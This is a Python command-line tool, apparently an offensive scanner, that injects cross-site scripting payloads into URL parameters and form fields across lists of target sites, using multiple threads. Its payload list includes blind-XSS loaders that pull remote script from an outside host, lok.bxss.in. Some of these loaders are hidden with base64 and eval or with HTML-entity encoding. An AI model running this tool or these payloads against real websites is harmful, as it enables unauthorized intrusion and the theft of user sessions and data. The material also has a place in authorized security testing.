import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
import json
import time
import concurrent.futures
from requests.exceptions import RequestException, ConnectionError, Timeout, TooManyRedirects

# Advanced XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "javascript:eval('var a=document.createElement(\"script\");a.src=\"https://lok.bxss.in\";document.body.appendChild(a)')",
    "\"><script src=https://lok.bxss.in></script>",
    "\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbG9rLmJ4c3MuaW4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>",
    "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbG9rLmJ4c3MuaW4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>",
    "\"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbG9rLmJ4c3MuaW4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>",
    "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;lok.bxss.in&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">",
    "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//lok.bxss.in\");a.send();</script>",
    "<script>$.getScript(\"//lok.bxss.in\")</script>"
]

# Headers to mimic a real browser
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

def detect_parameters(url):
    """Detect query parameters in the URL."""
    parsed = urlparse(url)
    return parse_qs(parsed.query)

def extract_forms(url, session):
    """Extract all forms from the page."""
    try:
        response = session.get(url, headers=HEADERS, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except RequestException as e:
        print(f"[-] Failed to fetch {url}: {e}")
        return []

def submit_form(form, url, payload, session):
    """Submit a form with a payload."""
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    form_url = urljoin(url, action)
    inputs = form.find_all("input")
    data = {}
    for input in inputs:
        name = input.attrs.get("name")
        value = input.attrs.get("value", "")
        if name:
            data[name] = value + payload
    try:
        if method == "post":
            return session.post(form_url, data=data, headers=HEADERS, timeout=10)
        else:
            return session.get(form_url, params=data, headers=HEADERS, timeout=10)
    except RequestException as e:
        print(f"[-] Failed to submit form to {form_url}: {e}")
        return None

def scan_xss(url, session, verbose=False):
    """Scan a URL for XSS vulnerabilities."""
    vulnerabilities = []
    if verbose:
        print(f"[*] Scanning {url} for XSS vulnerabilities...")

    # Test URL parameters
    params = detect_parameters(url)
    for param in params:
        for payload in XSS_PAYLOADS:
            test_url = url.replace(f"{param}=", f"{param}={payload}")
            try:
                response = session.get(test_url, headers=HEADERS, timeout=10)
                if payload in response.text:
                    vulnerabilities.append({
                        "type": "URL Parameter",
                        "url": test_url,
                        "payload": payload,
                        "severity": "High",
                        "parameter": param,
                    })
            except RequestException as e:
                if verbose:
                    print(f"[-] Failed to test URL {test_url}: {e}")

    # Test forms
    forms = extract_forms(url, session)
    for form in forms:
        for payload in XSS_PAYLOADS:
            response = submit_form(form, url, payload, session)
            if response and payload in response.text:
                vulnerabilities.append({
                    "type": "Form",
                    "url": url,
                    "payload": payload,
                    "severity": "High",
                    "parameter": "Form Input",
                })

    return vulnerabilities

def generate_report(vulnerabilities, output_file):
    """Generate a JSON report of vulnerabilities."""
    with open(output_file, "w") as f:
        json.dump(vulnerabilities, f, indent=4)
    print(f"[+] Report saved to {output_file}")

def read_urls_from_file(file_path):
    """Read URLs from a text file."""
    with open(file_path, "r") as f:
        urls = f.read().splitlines()
    return urls

def main():
    parser = argparse.ArgumentParser(description="Advanced XSS Scanner Tool")
    parser.add_argument("-u", "--url", help="Single URL to scan for XSS vulnerabilities")
    parser.add_argument("-f", "--file", help="Path to the file containing URLs to scan")
    parser.add_argument("-o", "--output", default="xss_report.json", help="Output file for the report")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use for scanning")
    args = parser.parse_args()

    if not args.url and not args.file:
        print("[-] Error: Please provide either a single URL (-u) or a file containing URLs (-f).")
        return

    all_vulnerabilities = []
    session = requests.Session()

    # Scan a single URL
    if args.url:
        vulnerabilities = scan_xss(args.url, session, args.verbose)
        if vulnerabilities:
            all_vulnerabilities.extend(vulnerabilities)

    # Scan URLs from a file
    if args.file:
        urls = read_urls_from_file(args.file)
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            future_to_url = {executor.submit(scan_xss, url, session, args.verbose): url for url in urls}
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    vulnerabilities = future.result()
                    if vulnerabilities:
                        all_vulnerabilities.extend(vulnerabilities)
                except Exception as e:
                    if args.verbose:
                        print(f"[-] Error scanning {url}: {e}")

    # Generate report
    if all_vulnerabilities:
        print("[+] XSS vulnerabilities found:")
        for vuln in all_vulnerabilities:
            print(f" - Type: {vuln['type']}")
            print(f"   URL: {vuln['url']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Severity: {vuln['severity']}")
            print(f"   Parameter: {vuln['parameter']}")
        generate_report(all_vulnerabilities, args.output)
    else:
        print("[-] No XSS vulnerabilities found.")

if __name__ == "__main__":
    main()
